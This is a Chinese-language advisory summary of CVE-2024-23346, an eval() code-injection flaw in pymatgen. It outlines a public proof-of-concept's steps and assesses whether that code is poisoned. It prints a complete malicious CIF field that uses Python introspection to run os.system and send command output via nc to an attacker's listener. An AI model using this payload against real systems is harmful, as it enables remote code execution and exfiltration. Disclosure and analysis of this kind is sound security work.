## CVE-2024-23346-pymatgen-代码注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 代码注入

**影响应用:** pymatgen

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2024.2.20

**利用条件:** 需要能够上传CIF文件，且目标系统安装了受影响版本的pymatgen

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-23346 漏洞存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中。该方法使用 `eval()` 处理输入，这使得攻击者可以通过构造恶意的 `transformation_string` 在目标系统上执行任意代码。PoC 代码通过上传包含恶意 `_space_group_magn.transform_BNS_Pp_abc` 字段的 CIF 文件，触发漏洞。漏洞利用过程如下：

1.  **登录:** 使用提供的用户名和密码登录目标应用。
2.  **清理:** 删除所有现有的结构。
3.  **命令执行:** 循环执行命令直到输入 "exit"。
    *   **反弹shell:** 监听指定端口,用于接收反弹shell
    *   **生成恶意CIF文件:**  构造包含恶意代码的CIF文件。该CIF文件包含一个经过精心设计的`_space_group_magn.transform_BNS_Pp_abc` 字段，其中包含要执行的命令和反弹shell指令。`_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("echo $(echo $({cmd}) | /usr/bin/nc -nv {lhost} {randport})");0,0,0'`  该字段利用python的自省机制，获取os模块并执行命令。
    *   **上传CIF文件:** 将恶意CIF文件上传到目标服务器。
    *   **触发漏洞:** 访问上传的结构，触发 `JonesFaithfulTransformation.from_transformation_str()` 方法，执行恶意代码。
    *   **删除结构:** 清理上传的结构。
4.  **退出:** 退出终端。

**投毒风险分析：** PoC代码主要执行了命令执行和反弹shell的功能。虽然该代码本身不包含明显的恶意行为，但`exploit.py`脚本需要用户提供目标地址、用户名、密码以及监听地址。这意味着攻击者可能诱导用户使用该脚本攻击目标。脚本中使用了`eval`函数，存在被滥用的风险，但这不是作者主动投毒，而是漏洞本身的性质。删除所有结构的delete_all方法也可能会被恶意利用，导致数据丢失。总体投毒风险较低，估计为10%。大部分代码逻辑是围绕漏洞验证,后门代码是验证漏洞的不可或缺的部分,因此不能判定为投毒代码。

**项目地址:** [MAWK0235/CVE-2024-23346](https://github.com/MAWK0235/CVE-2024-23346)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)